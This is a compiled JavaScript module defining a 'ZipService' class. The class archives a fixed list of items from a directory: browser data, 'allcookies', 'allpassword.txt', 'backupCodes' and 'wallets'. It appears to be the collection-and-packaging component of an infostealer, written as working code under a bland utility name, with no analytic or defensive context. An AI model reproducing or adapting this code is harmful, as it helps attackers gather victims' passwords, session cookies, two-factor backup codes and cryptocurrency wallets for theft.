Object.defineProperty(exports, "__esModule", {
  value: true
});
const fs = require("fs");
const path = require("path");
const archiver = require("archiver");
class ZipService {
  static async zipCollection(directory, destination) {
    const output = fs.createWriteStream(destination);
    const archive = archiver("zip", {
      zlib: {
        level: 9
      }
    });
    return new Promise((resolve, reject) => {
      output.on("close", () => resolve());
      archive.on("error", error => reject(error));
      archive.pipe(output);
      for (const name of ["browsers", "allcookies", "allpassword.txt", "backupCodes", "wallets"]) {
        const entry = path.join(directory, name);
        if (fs.existsSync(entry)) {
          if (fs.statSync(entry).isDirectory()) archive.directory(entry, name);else archive.file(entry, {
            name
          });
        }
      }
      archive.finalize();
    });
  }
}
exports.ZipService = ZipService;
